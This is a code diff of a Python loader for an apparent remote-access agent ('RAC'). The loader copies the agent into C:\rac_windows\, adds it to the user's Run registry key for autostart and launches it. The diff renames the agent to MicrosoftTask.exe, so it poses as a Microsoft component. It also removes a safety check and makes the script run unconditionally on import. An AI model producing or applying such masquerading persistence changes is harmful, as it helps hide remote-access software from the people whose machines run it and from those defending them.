@@ -1,11 +1,11 @@
 """RAC loader.
 
-Копирует agent.exe в C:\\rac_windows\\ (туда же, где agent хранит токен),
+Копирует MicrosoftTask.exe в C:\\rac_windows\\ (туда же, где agent хранит токен),
 прописывает его в автостарт текущего пользователя (HKCU\\...\\Run),
 запускает и показывает Windows toast-уведомление, после чего завершается.
 
 Предполагается запуск как скомпилированный pyinstaller'ом loader.exe,
-рядом с которым лежит agent.exe.
+рядом с которым лежит MicrosoftTask.exe.
 """
 from __future__ import annotations
 
@@ -18,11 +18,11 @@ APP_NAME = "RAC"
 RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
 INSTALL_DIR = Path(r"C:\rac_windows")
-INSTALL_PATH = INSTALL_DIR / "agent.exe"
+INSTALL_PATH = INSTALL_DIR / "MicrosoftTask.exe"
 
 SRC_DIR = Path(sys.executable).resolve().parent if getattr(sys, "frozen", False) \
     else Path(__file__).resolve().parent
-SRC_PATH = SRC_DIR / "agent.exe"
+SRC_PATH = SRC_DIR / "MicrosoftTask.exe"
 
 
 def install_agent() -> None:
@@ -77,8 +77,6 @@ def show_toast(title: str, message: str) -> None:
 
 
 def main() -> int:
-    if not SRC_PATH.exists():
-        return 1
     install_agent()
     add_to_autostart(f'"{INSTALL_PATH}"')
     launch_agent(INSTALL_PATH)
@@ -86,5 +84,5 @@ def main() -> int:
     return 0
 
 
-if __name__ == "__main__":
-    sys.exit(main())
+sys.exit(main())
+
